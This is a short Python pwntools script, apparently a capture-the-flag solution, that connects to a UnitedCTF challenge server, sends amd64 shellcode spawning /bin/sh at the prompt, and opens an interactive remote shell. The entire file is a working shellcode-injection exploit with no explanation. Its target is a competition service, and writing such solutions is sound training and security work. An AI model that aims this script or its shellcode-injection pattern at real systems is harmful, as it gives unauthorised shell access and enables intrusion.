#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")

RHOST, RPORT = "nc.ctf.unitedctf.ca", 6000

r = remote(RHOST, RPORT)
r.sendlineafter(b"> ", asm(shellcraft.sh()))
r.interactive()
